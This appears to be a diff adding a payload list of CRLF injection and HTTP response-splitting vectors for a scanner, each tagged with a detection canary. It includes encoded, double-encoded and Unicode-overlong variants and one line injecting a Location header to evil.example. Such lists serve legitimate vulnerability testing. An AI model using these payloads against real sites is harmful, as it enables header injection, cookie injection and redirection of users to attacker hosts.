@@ -1,0 +1,12 @@
+# CRLF / response-splitting vectors. {MARKER} is replaced with the canary
+# Set-Cookie marker so every payload carries the detection canary. Detection only.
+%0d%0a{MARKER}
+%0d%0a%0d%0a{MARKER}
+%0d%0aContent-Length:0%0d%0a%0d%0a{MARKER}
+%3f%0d%0a{MARKER}
+%2f%2e%2e%2f%0d%0a{MARKER}
+%00%0d%0a{MARKER}
+%0d%0aLocation:https://evil.example%0d%0a{MARKER}
+%e5%98%8a%e5%98%8d{MARKER}
+%25%30%64%25%30%61{MARKER}
+%u560a%u560d{MARKER}
